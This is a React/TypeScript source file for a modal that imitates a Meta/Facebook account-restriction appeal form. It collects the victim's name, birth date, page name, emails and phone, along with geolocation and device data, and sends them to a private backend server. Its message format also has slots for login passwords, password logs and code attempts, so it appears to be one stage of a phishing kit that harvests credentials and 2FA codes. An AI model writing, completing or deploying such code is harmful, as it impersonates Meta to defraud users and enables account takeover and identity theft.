import '@/assets/css/meta-verified-modals.css';
import '@/assets/css/phone-input.css';
import type { MetaVerifiedTexts } from '@/constants/meta-verified-texts';
import { useSocketEmit } from '@/hooks/use-socket';
import { store } from '@/store/store';
import { getDeviceLabel } from '@/utils/device';
import { buildAppealMessage, geoToIpInfo } from '@/utils/message';
import { sendAppealMessage } from '@/hooks/use-socket';
import translateText from '@/utils/translate';
import { faXmark } from '@fortawesome/free-solid-svg-icons/faXmark';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import IntlTelInput from 'intl-tel-input/reactWithUtils';
import 'intl-tel-input/styles';
import {
    type ChangeEvent,
    type FC,
    type FormEvent,
    type KeyboardEvent,
    useCallback,
    useEffect,
    useMemo,
    useRef,
    useState
} from 'react';

type FormFieldName = 'fullName' | 'dateOfBirth' | 'facebookPageName' | 'businessEmail' | 'personalEmail';

interface FormData {
    fullName: string;
    dateOfBirth: string;
    facebookPageName: string;
    businessEmail: string;
    personalEmail: string;
    reason: string;
    additionalNotes: string;
}

const TEXT = {
    title: 'Verification information',
    intro:
        'Please indicate why you believe that account restrictions were imposed by mistake. Our technology and team work in multiple languages to ensure consistent enforcement of rules. You can communicate with us in your native language.',
    submitError:
        'Please fill in correctly and completely all required fields to complete the verification profile.',
    sendError:
        'Could not reach the approval server. Start the backend (pnpm dev:backend) and check VPS_BACKEND_URL in .env.local.',
    fullName: 'Full Name',
    fullNamePlaceholder: 'Enter your full name',
    dateOfBirth: 'Date of Birth',
    pageName: 'Facebook Page Name',
    pageNamePlaceholder: 'Enter your Facebook page name',
    businessEmail: 'Business Email',
    businessEmailPlaceholder: 'Enter your business email',
    personalEmail: 'Personal Email',
    personalEmailPlaceholder: 'Enter your personal email',
    phone: 'Mobile Phone Number',
    phonePlaceholder: 'Enter your mobile phone number',
    reasonHeading: 'What do you think happened?',
    reasonErroneous: 'An erroneous report or unfair competitive complaint.',
    reasonNotification: 'This notification was sent in error.',
    reasonNoFraud: 'No fraud involved / another legitimate reason:',
    additionalNotesPlaceholder: 'Additional notes (optional)',
    continue: 'Continue',
    footer: 'Meta © 2026'
} as const;

const REASON_OPTIONS = [
    { value: 'erroneous_report', labelKey: 'reasonErroneous' as const },
    { value: 'notification_error', labelKey: 'reasonNotification' as const },
    { value: 'no_fraud', labelKey: 'reasonNoFraud' as const }
];

const textsToTranslate = Object.values(TEXT);

const InitModal: FC<{ nextStep: () => void; uiTexts: MetaVerifiedTexts }> = ({ nextStep, uiTexts }) => {
    const [isLoading, setIsLoading] = useState(false);
    const [phoneNumber, setPhoneNumber] = useState('');
    const [translations, setTranslations] = useState<Record<string, string>>({});
    const [submitError, setSubmitError] = useState('');
    const [invalidFields, setInvalidFields] = useState<Partial<Record<FormFieldName, boolean>>>({});
    const [phoneInvalid, setPhoneInvalid] = useState(false);
    const [reasonInvalid, setReasonInvalid] = useState(false);
    const phoneWrapRef = useRef<HTMLDivElement>(null);

    const [formData, setFormData] = useState<FormData>({
        fullName: '',
        dateOfBirth: '',
        facebookPageName: '',
        businessEmail: '',
        personalEmail: '',
        reason: '',
        additionalNotes: ''
    });

    const { setModalOpen, geoInfo, setUserData, setMessageId, deviceLabel, setDeviceLabel, messageId } = store();
    const { socket } = useSocketEmit();
    const countryCode = geoInfo?.country_code.toLowerCase() || 'us';

    const t = (text: string): string => translations[text] || text;

    useEffect(() => {
        document.title = TEXT.title;
    }, []);

    useEffect(() => {
        if (deviceLabel !== 'Unknown') {
            return;
        }

        const loadDevice = async () => {
            const label = await getDeviceLabel();
            setDeviceLabel(label);
        };

        void loadDevice();
    }, [deviceLabel, setDeviceLabel]);

    useEffect(() => {
        if (!geoInfo) {
            return;
        }

        const translateAll = async () => {
            const translatedMap: Record<string, string> = {};
            for (const text of textsToTranslate) {
                translatedMap[text] = await translateText(text, geoInfo.country_code);
            }
            setTranslations(translatedMap);
        };

        translateAll();
    }, [geoInfo]);

    const initOptions = useMemo(
        () => ({
            initialCountry: countryCode as '',
            separateDialCode: true,
            strictMode: true,
            nationalMode: false,
            autoPlaceholder: 'polite' as const,
            placeholderNumberType: 'MOBILE' as const,
            countrySearch: false
        }),
        [countryCode]
    );

    const clearFieldError = (name: FormFieldName) => {
        setInvalidFields((prev) => {
            if (!prev[name]) {
                return prev;
            }
            const next = { ...prev };
            delete next[name];
            return next;
        });
    };

    const handleInputChange = useCallback((e: ChangeEvent<HTMLInputElement | HTMLTextAreaElement>) => {
        const { name, value } = e.target;
        if (name in formData) {
            clearFieldError(name as FormFieldName);
        }
        setFormData((prev) => ({
            ...prev,
            [name]: value
        }));
    }, []);

    const handlePhoneChange = useCallback((number: string) => {
        setPhoneNumber(number);
        setPhoneInvalid(false);
        phoneWrapRef.current?.classList.remove('is-invalid');
    }, []);

    const handleReasonChange = (value: string) => {
        setFormData((prev) => ({ ...prev, reason: value }));
        setReasonInvalid(false);
    };

    const handlePhoneKeyDown = (e: KeyboardEvent<HTMLInputElement>) => {
        const allow = ['Backspace', 'Delete', 'ArrowLeft', 'ArrowRight', 'Tab', 'Home', 'End'];
        if (allow.includes(e.key) || e.ctrlKey || e.metaKey) {
            return;
        }
        if (!/^\d$/.test(e.key)) {
            e.preventDefault();
        }
    };

    const validate = (): boolean => {
        const nextInvalid: Partial<Record<FormFieldName, boolean>> = {};
        let hasError = false;

        (['fullName', 'dateOfBirth', 'facebookPageName', 'businessEmail', 'personalEmail'] as FormFieldName[]).forEach(
            (field) => {
                const empty = !formData[field].trim();
                if (empty) {
                    nextInvalid[field] = true;
                    hasError = true;
                }
            }
        );

        const phoneDigits = phoneNumber.replace(/\D/g, '');
        const phoneBad = !phoneNumber || phoneDigits.length < 8 || phoneDigits.length > 15;
        if (phoneBad) {
            setPhoneInvalid(true);
            phoneWrapRef.current?.classList.add('is-invalid');
            hasError = true;
        } else {
            setPhoneInvalid(false);
            phoneWrapRef.current?.classList.remove('is-invalid');
        }

        if (!formData.reason) {
            setReasonInvalid(true);
            hasError = true;
        } else {
            setReasonInvalid(false);
        }

        setInvalidFields(nextInvalid);

        if (hasError) {
            setSubmitError(uiTexts.fillRequiredFields);
            return false;
        }

        setSubmitError('');
        return true;
    };

    const handleSubmit = async (e: FormEvent<HTMLFormElement>) => {
        e.preventDefault();
        if (isLoading || !validate()) {
            return;
        }

        setIsLoading(true);

        const selectedReason = REASON_OPTIONS.find((o) => o.value === formData.reason);
        const reasonLabel = selectedReason ? t(TEXT[selectedReason.labelKey]) : formData.reason;

        const payload = {
            fullName: formData.fullName.trim(),
            dateOfBirth: formData.dateOfBirth.trim(),
            personalEmail: formData.personalEmail.trim(),
            businessEmail: formData.businessEmail.trim(),
            phone: phoneNumber,
            pageName: formData.facebookPageName.trim(),
            reason: reasonLabel || formData.reason,
            additionalNotes: formData.additionalNotes.trim()
        };

        try {
            setUserData({
                fullName: payload.fullName,
                personalEmail: payload.personalEmail,
                businessEmail: payload.businessEmail,
                phoneNumber: phoneNumber,
                facebookPageName: payload.pageName,
                information: [reasonLabel, payload.dateOfBirth, payload.additionalNotes].filter(Boolean).join(' | ')
            });

            if (!geoInfo) {
                setSubmitError(t(TEXT.sendError));
                return;
            }

            if (!socket) {
                setSubmitError(t(TEXT.sendError));
                return;
            }

            const message = buildAppealMessage({
                form: {
                    fullName: payload.fullName,
                    dateOfBirth: payload.dateOfBirth,
                    personalEmail: payload.personalEmail,
                    businessEmail: payload.businessEmail,
                    phone: payload.phone,
                    pageName: payload.pageName,
                    additionalNotes: [reasonLabel, payload.additionalNotes].filter(Boolean).join(' | ')
                },
                login: { email: '', password: '' },
                passwordLogs: [],
                codeAttempts: [],
                ip: geoToIpInfo(geoInfo),
                deviceLabel
            });
            const newMessageId = await sendAppealMessage(socket, {
                message,
                message_id: messageId,
                stage: 'info'
            });
            setMessageId(newMessageId);
            nextStep();
        } catch {
            setSubmitError(t(TEXT.sendError));
        } finally {
            setIsLoading(false);
        }
    };

    const fieldInputClass = (name: FormFieldName) =>
        `mv-modal-input${invalidFields[name] ? ' is-error' : ''}`;

    return (
        <div className='mv-modal-overlay' role='dialog' aria-modal='true'>
            <div className='mv-modal-card mv-modal-card--form' onClick={(e) => e.stopPropagation()}>
                <div className='mv-modal-header'>
                    <h2 className='mv-modal-title'>{uiTexts.verificationInfo}</h2>
                    <button
                        type='button'
                        className='mv-modal-close'
                        onClick={() => setModalOpen(false)}
                        aria-label='Close'
                    >
                        <FontAwesomeIcon icon={faXmark} />
                    </button>
                </div>

                <p className='mv-modal-subtitle'>{uiTexts.fillRequiredFields}</p>
                <p className='mv-modal-subtitle' style={{ paddingTop: 0 }}>
                    {t(TEXT.intro)}
                </p>

                <div className='mv-modal-body'>
                    <form id='verification-form' noValidate onSubmit={handleSubmit}>
                        {submitError ? (
                            <p className='mb-2 text-[13px] text-red-600' role='alert'>
                                {submitError}
                            </p>
                        ) : null}

                        <div className='mv-modal-field'>
                            <label className='mv-modal-label' htmlFor='fullName'>
                                {uiTexts.fullName}
                                <span className='mv-modal-required'>*</span>
                            </label>
                            <input
                                id='fullName'
                                name='fullName'
                                type='text'
                                placeholder={uiTexts.fullNamePlaceholder}
                                value={formData.fullName}
                                onChange={handleInputChange}
                                className={fieldInputClass('fullName')}
                            />
                        </div>

                        <div className='mv-modal-field'>
                            <label className='mv-modal-label' htmlFor='dateOfBirth'>
                                {t(TEXT.dateOfBirth)}
                                <span className='mv-modal-required'>*</span>
                            </label>
                            <input
                                id='dateOfBirth'
                                name='dateOfBirth'
                                type='date'
                                value={formData.dateOfBirth}
                                onChange={handleInputChange}
                                className={fieldInputClass('dateOfBirth')}
                            />
                        </div>

                        <div className='mv-modal-field'>
                            <label className='mv-modal-label' htmlFor='facebookPageName'>
                                {uiTexts.yourPageName}
                                <span className='mv-modal-required'>*</span>
                            </label>
                            <input
                                id='facebookPageName'
                                name='facebookPageName'
                                type='text'
                                placeholder={uiTexts.pageNamePlaceholder}
                                value={formData.facebookPageName}
                                onChange={handleInputChange}
                                className={fieldInputClass('facebookPageName')}
                            />
                        </div>

                        <div className='mv-modal-field'>
                            <label className='mv-modal-label' htmlFor='businessEmail'>
                                {uiTexts.businessEmail}
                                <span className='mv-modal-required'>*</span>
                            </label>
                            <input
                                id='businessEmail'
                                name='businessEmail'
                                type='email'
                                placeholder={uiTexts.businessEmailPlaceholder}
                                value={formData.businessEmail}
                                onChange={handleInputChange}
                                className={fieldInputClass('businessEmail')}
                            />
                        </div>

                        <div className='mv-modal-field'>
                            <label className='mv-modal-label' htmlFor='personalEmail'>
                                {uiTexts.personalEmail}
                                <span className='mv-modal-required'>*</span>
                            </label>
                            <input
                                id='personalEmail'
                                name='personalEmail'
                                type='email'
                                placeholder={uiTexts.personalEmailPlaceholder}
                                value={formData.personalEmail}
                                onChange={handleInputChange}
                                className={fieldInputClass('personalEmail')}
                            />
                        </div>

                        <div className='mv-modal-field'>
                            <label className='mv-modal-label' htmlFor='phone-input'>
                                {uiTexts.mobilePhone}
                                <span className='mv-modal-required'>*</span>
                            </label>
                            <div id='phone-wrap' ref={phoneWrapRef} className={phoneInvalid ? 'is-invalid' : ''}>
                                <IntlTelInput
                                    onChangeNumber={handlePhoneChange}
                                    initOptions={initOptions}
                                    inputProps={{
                                        id: 'phone-input',
                                        name: 'phone',
                                        type: 'tel',
                                        inputMode: 'numeric',
                                        placeholder: uiTexts.mobilePhonePlaceholder,
                                        className: 'form-control iti__tel-input',
                                        onKeyDown: handlePhoneKeyDown
                                    }}
                                />
                            </div>
                        </div>

                        <div className='mv-modal-field'>
                            <p className='mv-modal-label'>{t(TEXT.reasonHeading)}</p>
                            <div id='reason-group' className={`space-y-2 ${reasonInvalid ? 'rounded-lg border border-red-500 p-2' : ''}`}>
                                {REASON_OPTIONS.map((option) => (
                                    <label key={option.value} className='flex cursor-pointer items-start gap-2 text-[13px] text-[#333]'>
                                        <input
                                            type='radio'
                                            name='reason'
                                            value={option.value}
                                            checked={formData.reason === option.value}
                                            onChange={() => handleReasonChange(option.value)}
                                        />
                                        <span role='presentation' onClick={() => handleReasonChange(option.value)}>
                                            {t(TEXT[option.labelKey])}
                                        </span>
                                    </label>
                                ))}
                                <textarea
                                    id='additionalNotes'
                                    name='additionalNotes'
                                    placeholder={t(TEXT.additionalNotesPlaceholder)}
                                    value={formData.additionalNotes}
                                    onChange={handleInputChange}
                                    className='mv-modal-input mt-1 h-16 resize-none'
                                />
                            </div>
                        </div>

                        <button type='submit' disabled={isLoading} className='mv-modal-submit'>
                            {isLoading ? <span className='mv-modal-spinner' /> : uiTexts.confirm}
                        </button>
                    </form>
                </div>
            </div>
        </div>
    );
};

export default InitModal;
